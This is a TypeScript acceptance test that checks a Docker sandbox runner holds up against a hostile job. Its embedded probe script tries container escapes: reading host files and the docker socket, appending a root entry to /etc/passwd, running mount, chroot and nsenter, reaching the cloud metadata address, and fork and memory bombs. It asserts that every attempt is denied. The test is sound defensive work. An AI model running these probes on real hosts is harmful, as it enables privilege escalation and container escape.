/**
 * SEC06: read-only sandbox escape attempt. PASS: no host filesystem or privileged network access.
 * Real Docker containers started by the kernel sandbox runner execute a hostile probe script. Host-side canaries:
 *   - a TCP listener on 0.0.0.0 (reachable from containers as host.docker.internal / gateway) counting connections;
 *   - a canary file in a private directory that is NOT mounted, whose content must never appear in any output;
 *   - a read-only mounted snapshot directory whose hash must be unchanged;
 *   - a canary environment variable in the test process that must not be visible inside.
 * Only the disposable probe containers are touched; nothing on the host is attacked.
 */
import { spawnSync } from "node:child_process";
import { createHash, randomBytes } from "node:crypto";
import { mkdirSync, mkdtempSync, readFileSync, readdirSync, rmSync, writeFileSync } from "node:fs";
import net from "node:net";
import type { AddressInfo } from "node:net";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterAll, beforeAll, expect, it } from "vitest";
import { observe } from "@nearesis/acceptance";
import { SandboxPolicyError, runSandboxed, sandboxArgs } from "../../packages/kernel/src/sandbox.ts";
import { SANDBOX_IMAGE, ensureSandboxImage } from "../../packages/kernel/src/plugins/sandbox-image.ts";
import { hostileManifest, rig } from "./_plugin-harness.ts";

const IMAGE = SANDBOX_IMAGE;
/**
 * The shipped sandbox image is distroless (node only: no shell, mount, chroot, unshare, su or nsenter), so those escape
 * binaries cannot be probed from inside it. The SAME hostile probe therefore also runs, under the SAME runner flags, in a
 * test-only tool image that does carry them (the digest-pinned node trixie-slim used as the build base elsewhere). The
 * confinement comes from the runner flags and the kernel (capabilities, no_new_privs, seccomp, namespaces), not from which
 * binaries exist, so the tool-image run is a real attempt of every escape primitive; the shipped image run proves the
 * image adds no shell and no escape binary. A tool image that is unavailable is reported as blocked, never as a pass.
 */
const TOOL_IMAGE =
  "node:24-trixie-slim@sha256:af02d57b57719b9657a45199a79264a9437940cd55b3c7b3fc99615654f124a0";
const docker = (...a: string[]) => spawnSync("docker", a, { encoding: "utf8" });
const dockerUp = docker("version", "--format", "{{.Server.Version}}").status === 0;
const imageId =
  dockerUp && ensureSandboxImage()
    ? docker("image", "inspect", IMAGE, "--format", "{{.Id}}").stdout.trim()
    : "";

const toolImageId = dockerUp
  ? docker("image", "inspect", TOOL_IMAGE, "--format", "{{.Id}}").stdout.trim()
  : "";

let work = "";
let canaryFile = "";
let snapshot = "";
let listener: net.Server;
let hostPort = 0;
let hits = 0;
const CANARY_TEXT = `HOST-FS-CANARY-${randomBytes(8).toString("hex")}`;
const CANARY_ENV = `HOST-ENV-CANARY-${randomBytes(8).toString("hex")}`;
beforeAll(async () => {
  work = mkdtempSync(join(tmpdir(), "sec06-"));
  mkdirSync(join(work, "private"));
  canaryFile = join(work, "private", "canary.txt");
  writeFileSync(canaryFile, CANARY_TEXT);
  snapshot = join(work, "snapshot");
  mkdirSync(snapshot);
  writeFileSync(join(snapshot, "data.csv"), "a,b\n1,2\n");
  listener = net.createServer((s) => {
    hits++;
    s.destroy();
  });
  await new Promise<void>((r) => listener.listen(0, "0.0.0.0", r));
  hostPort = (listener.address() as AddressInfo).port;
  process.env.SEC06_CANARY_SECRET = CANARY_ENV;
});
afterAll(async () => {
  delete process.env.SEC06_CANARY_SECRET;
  await new Promise((r) => listener?.close(() => r(null)));
  if (work) rmSync(work, { recursive: true, force: true });
});

const dirHash = (d: string) =>
  createHash("sha256")
    .update(
      readdirSync(d)
        .sort()
        .map((f) => `${f}:${readFileSync(join(d, f), "utf8")}`)
        .join("|"),
    )
    .digest("hex");

/** The hostile job. Every probe reports what it observed; none of them is expected to succeed. */
const PROBE = (hostPort: number, canaryPath: string) => `
const fs = require("fs"), net = require("net"), cp = require("child_process"), dns = require("dns"), os = require("os");
const out = {};
const t = (name, fn) => { try { out[name] = fn(); } catch (e) { out[name] = "denied:" + (e.code || e.message || String(e)).slice(0, 40); } };
const tcp = (host, port) => new Promise((res) => { const s = net.connect({ host, port, timeout: 1500 }); s.on("connect", () => { s.destroy(); res("CONNECTED"); }); s.on("timeout", () => { s.destroy(); res("denied:timeout"); }); s.on("error", (e) => res("denied:" + (e.code || e.message))); });
const sh = (c) => { const r = cp.spawnSync("/bin/sh", ["-c", c], { encoding: "utf8", timeout: 4000 }); return { status: r.status, spawnError: r.error ? (r.error.code || "error") : null, out: ((r.stdout||"") + (r.stderr||"")).slice(0, 200) }; };
(async () => {
  // identity and confinement flags as the kernel sees them
  const st = fs.readFileSync("/proc/self/status", "utf8");
  out.uid = process.getuid();
  out.capEff = /CapEff:\\s*(\\w+)/.exec(st)[1];
  out.noNewPrivs = /NoNewPrivs:\\s*(\\d)/.exec(st)[1];
  out.seccomp = /Seccomp:\\s*(\\d)/.exec(st)[1];
  out.shellPresent = fs.existsSync("/bin/sh");
  out.escapeBinaries = ["mount", "chroot", "unshare", "su", "nsenter"].filter((b) => ["/bin/", "/usr/bin/", "/sbin/", "/usr/sbin/"].some((d) => fs.existsSync(d + b)));
  out.interfaces = Object.keys(os.networkInterfaces()).filter((n) => n !== "lo");
  // host filesystem reads
  t("read_host_canary", () => fs.readFileSync(${JSON.stringify(canaryPath)}, "utf8"));
  t("read_docker_sock", () => fs.statSync("/var/run/docker.sock").isSocket() ? "PRESENT" : "no");
  t("read_proc1_root", () => fs.readdirSync("/proc/1/root/Users").join(","));
  t("read_host_mnt", () => fs.readdirSync("/host").join(","));
  t("read_env_canary", () => process.env.SEC06_CANARY_SECRET || process.env.HOME_CANARY || "absent");
  t("read_proc_environ", () => fs.readFileSync("/proc/1/environ", "utf8").includes("CANARY") ? "LEAKED" : "clean");
  // writes
  t("write_rootfs", () => { fs.writeFileSync("/probe.txt", "x"); return "WROTE"; });
  t("write_etc", () => { fs.appendFileSync("/etc/passwd", "evil::0:0::/:/bin/sh\\n"); return "WROTE"; });
  t("write_snapshot", () => { fs.writeFileSync("/snapshot/data.csv", "tampered"); return "WROTE"; });
  t("delete_snapshot", () => { fs.unlinkSync("/snapshot/data.csv"); return "DELETED"; });
  t("write_scratch", () => { fs.writeFileSync("/tmp/ok.txt", "x"); return "scratch-writable"; });
  t("exec_from_scratch", () => { fs.writeFileSync("/tmp/x.sh", "#!/bin/sh\\necho pwn\\n", { mode: 0o755 }); const r = cp.spawnSync("/tmp/x.sh", { encoding: "utf8" }); if (r.error) throw r.error; return r.stdout.includes("pwn") ? "EXECUTED" : "no"; });
  // privilege and namespace escapes
  out.mount = sh("mount -t tmpfs none /mnt 2>&1; echo rc=$?");
  out.chroot = sh("chroot /proc/1/root /bin/true 2>&1; echo rc=$?");
  out.unshare = sh("unshare -U -r id 2>&1; echo rc=$?");
  out.setuid_bin = sh("su -c id 2>&1; echo rc=$?");
  out.nsenter = sh("nsenter -t 1 -m -u -n -i sh -c id 2>&1; echo rc=$?");
  out.raw_socket = await new Promise((res) => { try { const s = require("dgram").createSocket("udp4"); s.on("error", (e) => res("denied:" + e.code)); s.bind(0, () => { try { cp.spawnSync("ping", ["-c1", "-W1", "127.0.0.1"], { timeout: 2000 }); } catch {} s.close(); res("udp-bound-local-only"); }); } catch (e) { res("denied:" + e.code); } });
  // network
  out.net_host_gateway = await tcp("host.docker.internal", ${hostPort});
  out.net_bridge_gw = await tcp("172.17.0.1", ${hostPort});
  out.net_metadata = await tcp("169.254.169.254", 80);
  out.net_external_ip = await tcp("1.1.1.1", 443);
  out.net_dns = await new Promise((res) => dns.lookup("example.com", (e, a) => res(e ? "denied:" + e.code : "RESOLVED " + a)));
  // resources
  out.fork_children_started = (() => { let n = 0; for (let i = 0; i < 200; i++) { try { const c = fs.existsSync("/bin/sleep") ? cp.spawn("/bin/sleep", ["5"], { stdio: "ignore", detached: true }) : cp.spawn(process.execPath, ["-e", "setTimeout(()=>{},5000)"], { stdio: "ignore", detached: true }); if (c.pid) n++; c.on("error", () => {}); } catch { break; } } return n; })();
  console.log("PROBE_JSON " + JSON.stringify(out));
  process.exit(0);
})();
`;

const run = (extra: Parameters<typeof runSandboxed>[0] extends infer S ? Partial<S> : never) =>
  runSandboxed({
    image: imageId || IMAGE,
    command: ["node", "-"],
    stdin: PROBE(hostPort, canaryFile),
    readOnlyMounts: [{ host: snapshot, container: "/snapshot" }],
    timeoutMs: 60_000,
    ...extra,
  });

it("SEC06: a hostile job inside the read-only sandbox reaches no host file, host service, metadata address or privilege", async () => {
  if (!dockerUp || !imageId) {
    observe({
      testId: "SEC06",
      observed: "Docker or the pinned node image is not available on this host",
      blocked: "container runtime unavailable",
    });
    return;
  }
  const snapBefore = dirHash(snapshot);

  // ---- policy layer (no container needed): refused mounts, env and shapes
  const refused: string[] = [];
  const mustRefuse = (name: string, f: () => unknown) => {
    try {
      f();
    } catch (e) {
      if (e instanceof SandboxPolicyError) return void refused.push(`${name}:${e.reasonCode}`);
      throw e;
    }
    throw new Error(`policy accepted forbidden spec: ${name}`);
  };
  const base = { image: IMAGE, command: ["true"] };
  mustRefuse("mount /etc", () =>
    sandboxArgs({ ...base, readOnlyMounts: [{ host: "/etc", container: "/cfg" }] }, "n"),
  );
  mustRefuse("mount root", () =>
    sandboxArgs({ ...base, readOnlyMounts: [{ host: "/", container: "/host" }] }, "n"),
  );
  mustRefuse("mount docker socket", () =>
    sandboxArgs({ ...base, readOnlyMounts: [{ host: "/var/run/docker.sock", container: "/d" }] }, "n"),
  );
  mustRefuse("mount onto /proc", () =>
    sandboxArgs({ ...base, readOnlyMounts: [{ host: snapshot, container: "/proc/x" }] }, "n"),
  );
  mustRefuse("mount onto /tmp", () =>
    sandboxArgs({ ...base, readOnlyMounts: [{ host: snapshot, container: "/tmp" }] }, "n"),
  );
  mustRefuse("mount with option injection", () =>
    sandboxArgs({ ...base, readOnlyMounts: [{ host: snapshot, container: "/s,rw" }] }, "n"),
  );
  mustRefuse("bad env name", () => sandboxArgs({ ...base, env: { "A B": "1" } }, "n"));
  const a = sandboxArgs({ ...base, readOnlyMounts: [{ host: snapshot, container: "/snapshot" }] }, "n");
  for (const must of [
    "--network",
    "none",
    "--read-only",
    "--cap-drop",
    "ALL",
    "no-new-privileges",
    "--pids-limit",
    "--memory",
    "--user",
    "65534:65534",
  ])
    expect(a, `sandbox args must contain ${must}`).toContain(must);
  for (const never of ["--privileged", "--net=host", "--cap-add", "--pid", "host", "-v", "--device"])
    expect(a, `sandbox args must not contain ${never}`).not.toContain(never);
  expect(a.find((x) => x.includes("snapshot") && x.includes("target"))).toMatch(/readonly$/);

  // ---- the hostile job
  const r = await run({});
  expect(r.timedOut).toBe(false);
  const line = r.stdout.split("\n").find((l) => l.startsWith("PROBE_JSON "));
  expect(line, r.stderr).toBeTruthy();
  const p = JSON.parse(line!.slice("PROBE_JSON ".length)) as Record<string, unknown>;

  // The tool image (shell, mount, chroot, unshare, su, nsenter present) under the identical runner flags.
  const toolRun = toolImageId ? await run({ image: toolImageId }) : null;
  const toolLine = toolRun?.stdout.split("\n").find((l) => l.startsWith("PROBE_JSON "));
  const pt = toolLine ? (JSON.parse(toolLine.slice("PROBE_JSON ".length)) as Record<string, unknown>) : null;
  if (!pt) {
    observe({
      testId: "SEC06",
      observed: `the shipped distroless sandbox image has no escape binaries to probe, and the tool image ${TOOL_IMAGE} that would carry mount/chroot/unshare/su/nsenter is not available locally, so those escape primitives were NOT attempted`,
      blocked:
        "tool image unavailable: privilege-escape probes (mount, chroot, unshare, su, nsenter) could not run",
    });
    return;
  }
  const ESCAPES = ["mount", "chroot", "unshare", "setuid_bin", "nsenter"] as const;
  const escapeCommandRan = (v: unknown) => {
    const o = v as { spawnError: string | null; out: string };
    return !o.spawnError && o.out.length > 0 && !/not found|No such file/i.test(o.out);
  };
  const verify = (label: string, q: Record<string, unknown>, res: { stdout: string; stderr: string }) => {
    const d = (k: string) => String(q[k]).startsWith("denied:");
    // host filesystem
    for (const k of ["read_host_canary", "read_docker_sock", "read_proc1_root", "read_host_mnt"])
      expect(q[k], `${label} ${k}`).toMatch(/^denied:/);
    expect(q.read_env_canary, label).toBe("absent");
    expect(q.read_proc_environ, label).toBe("clean");
    expect(`${res.stdout}${res.stderr}`, label).not.toContain(CANARY_TEXT);
    expect(`${res.stdout}${res.stderr}`, label).not.toContain(CANARY_ENV);
    // read-only: nothing writable except the small non-executable scratch
    for (const k of ["write_rootfs", "write_etc", "write_snapshot", "delete_snapshot"])
      expect(d(k), `${label} ${k}=${String(q[k])}`).toBe(true);
    expect(q.write_scratch, label).toBe("scratch-writable");
    expect(q.exec_from_scratch, label).toMatch(/^denied:/);
    expect(dirHash(snapshot), label).toBe(snapBefore);
    // privilege: kernel-reported identity and confinement flags
    expect(q.uid, label).toBe(65534);
    expect(String(q.capEff).replace(/0/g, ""), label).toBe("");
    expect(q.noNewPrivs, label).toBe("1");
    expect(q.seccomp, label).toBe("2");
    // network
    expect(q.interfaces, label).toEqual([]);
    for (const k of ["net_host_gateway", "net_bridge_gw", "net_metadata", "net_external_ip", "net_dns"])
      expect(d(k), `${label} ${k}=${String(q[k])}`).toBe(true);
  };
  verify("shipped", p, r);
  verify("tool", pt, toolRun!);
  // shipped image: distroless, so no shell and none of the escape binaries exist (recorded, not counted as a probe pass)
  expect(p.shellPresent).toBe(false);
  expect(p.escapeBinaries).toEqual([]);
  // tool image: every escape primitive was really attempted (the command ran and was refused), none succeeded
  for (const k of ESCAPES) {
    expect(escapeCommandRan(pt[k]), `${k} did not actually run: ${JSON.stringify(pt[k])}`).toBe(true);
    expect(JSON.stringify(pt[k]), k).not.toMatch(/rc=0/);
  }
  expect(pt.escapeBinaries).toEqual(["mount", "chroot", "unshare", "su", "nsenter"]);
  expect(hits).toBe(0);
  const hardenedHits = hits;
  // probe validity: the same canary listener IS reachable from an unhardened default-network container, so the zero
  // above is the sandbox's doing and not a broken probe
  const ctl = spawnSync("docker", ["run", "--rm", "-i", "--pull", "never", imageId, "node", "-"], {
    input: PROBE(hostPort, canaryFile),
    encoding: "utf8",
    timeout: 60_000,
  });
  const ctlLine = ctl.stdout.split("\n").find((l) => l.startsWith("PROBE_JSON "));
  const ctlProbe = ctlLine ? (JSON.parse(ctlLine.slice(11)) as Record<string, unknown>) : {};
  expect([ctlProbe.net_host_gateway, ctlProbe.net_bridge_gw]).toContain("CONNECTED");
  // spawnSync blocked the event loop, so let the listener drain its accepted sockets (poll with a deadline)
  for (let i = 0; i < 40 && hits <= hardenedHits; i++) await new Promise((r) => setTimeout(r, 50));
  expect(hits).toBeGreaterThan(hardenedHits);
  // resources: the pid cap holds
  expect(Number(p.fork_children_started)).toBeLessThanOrEqual(64);
  expect(Number(pt.fork_children_started)).toBeLessThanOrEqual(64);

  // ---- bounded resources: memory bomb and endless loop are stopped
  const mem = await runSandboxed({
    image: imageId,
    command: ["node", "-e", "const a=[];for(;;)a.push(Buffer.alloc(8*1024*1024,1));"],
    memoryMb: 64,
    timeoutMs: 30_000,
  });
  expect(mem.exitCode).not.toBe(0);
  const spin = await runSandboxed({ image: imageId, command: ["node", "-e", "for(;;){}"], timeoutMs: 3000 });
  expect(spin.timedOut).toBe(true);
  // the timed-out container is gone (no orphan left running)
  await new Promise((res) => setTimeout(res, 1500));
  expect(docker("ps", "-q", "--filter", `name=${spin.containerName}`).stdout.trim()).toBe("");

  // ---- control: the sandbox still runs an honest job on the mounted read-only input
  const ok = await runSandboxed({
    image: imageId,
    command: [
      "node",
      "-e",
      "console.log(require('fs').readFileSync('/snapshot/data.csv','utf8').trim().split('\\n').length)",
    ],
    readOnlyMounts: [{ host: snapshot, container: "/snapshot" }],
  });
  expect(ok.stdout.trim()).toBe("2");

  // ---- REAL EXECUTION PATH: the same hostile plugin installed with isolation "sandbox" and run by the kernel's tool
  // gateway. The plugin module is never imported into this process; each invocation is one container from the runner.
  const hitsBeforePlugin = hits;
  const prng = await rig({
    prefix: "sec06",
    manifest: hostileManifest({ resourceLimits: { memoryMb: 64, cpuMs: 3000, concurrency: 2 } }),
    execution: { isolation: () => "sandbox", sandbox: { image: imageId } },
  });
  const pluginRuns: Record<string, unknown> = {};
  try {
    const revive = () =>
      prng.db.admin.query("UPDATE plugin_installations SET state = 'enabled', consecutive_failures = 0");
    const run = async (input: Record<string, unknown>) => {
      await revive();
      return prng.invoke(input);
    };
    const control = await run({ action: "ok", text: "through-the-sandbox" });
    expect(control.state).toBe("ok");
    expect((control.payload as { text: string }).text).toBe("through-the-sandbox");
    pluginRuns.control = control.state;
    // network: no packets, canary untouched
    for (const a of [
      { action: "bare-fetch", url: `http://host.docker.internal:${hostPort}/` },
      { action: "net-connect", host: "host.docker.internal", port: hostPort },
      { action: "http-request", url: `http://172.17.0.1:${hostPort}/` },
    ]) {
      const res = await run(a);
      expect(res.state, a.action).toBe("failed");
    }
    // filesystem and environment: the host canary file and env are invisible
    const rf = await run({ action: "read-file", path: canaryFile });
    expect(JSON.stringify(rf.payload)).not.toContain(CANARY_TEXT);
    const ev = await run({ action: "env", name: "SEC06_CANARY_SECRET" });
    expect((ev.payload as { canary: string | null }).canary).toBeNull();
    expect(JSON.stringify(ev.payload)).not.toContain(CANARY_ENV);
    // limits: each is a defined reason code and the host keeps running
    const memRes = await run({ action: "alloc" });
    const spinRes = await run({ action: "spin" });
    const bombRes = await run({ action: "fork-bomb" });
    const diskRes = await run({ action: "fill-disk" });
    pluginRuns.alloc = memRes.reasonCode;
    pluginRuns.spin = spinRes.reasonCode;
    pluginRuns.forkBomb = [bombRes.state, bombRes.reasonCode];
    pluginRuns.disk = diskRes.reasonCode;
    expect(memRes.reasonCode).toBe("PLUGIN_MEMORY_LIMIT");
    expect(spinRes.reasonCode).toBe("PLUGIN_CPU_LIMIT");
    expect(diskRes.reasonCode).toBe("PLUGIN_DISK_LIMIT");
    expect(bombRes.state === "failed" || (bombRes.payload as { kids?: number }).kids! <= 200).toBe(true);
    // no orphan containers from the plugin runs
    await new Promise((res) => setTimeout(res, 1500));
    expect(docker("ps", "-q", "--filter", "name=nearesis-sbx-").stdout.trim()).toBe("");
    // the plugin never ran in this process: the hostile module's env/FS views are the container's
    expect(hits).toBe(hitsBeforePlugin);
  } finally {
    await prng.drop();
  }

  const probes = Object.keys(p).length;
  observe({
    testId: "SEC06",
    observed: `hostile job in a --network none, read-only, cap-drop ALL, no-new-privileges, uid 65534 container (${probes} probe results): host canary file, docker socket, /proc/1/root and host env read attempts all denied (canary text and env value never in output); writes to root fs, /etc, the read-only snapshot mount and exec from scratch denied (snapshot hash unchanged); mount/chroot/unshare/su/nsenter each ran in the tool image under the same flags and was refused (the shipped distroless image has no shell and none of those binaries: ${JSON.stringify(p.escapeBinaries)}, shell present ${p.shellPresent}); effective capabilities 0; network interfaces besides lo: 0; host canary listener connections ${hardenedHits} (an unhardened control container reaches it: ${hits - hardenedHits}); metadata, host-gateway, external IP and DNS all failed; processes capped at ${p.fork_children_started}/200 (limit 64); ${refused.length} forbidden specs refused by policy; memory bomb exit ${mem.exitCode}, endless loop killed at timeout, honest control job read the mounted input; real path: a hostile plugin installed with isolation "sandbox" and invoked through the kernel tool gateway ran only in containers (never imported into the kernel), reached no canary, saw neither the host canary file nor env, and was stopped with reason codes ${JSON.stringify(pluginRuns)}`,
    fixtureHash: createHash("sha256").update(PROBE(0, "")).digest("hex"),
    evidence: {
      imageId,
      probes: p,
      toolImageProbes: pt,
      toolImage: TOOL_IMAGE,
      policyRefusals: refused,
      memExit: mem.exitCode,
      spinTimedOut: spin.timedOut,
      canaryConnections: hits,
      pluginRealPath: pluginRuns,
    },
  });
}, 300_000);
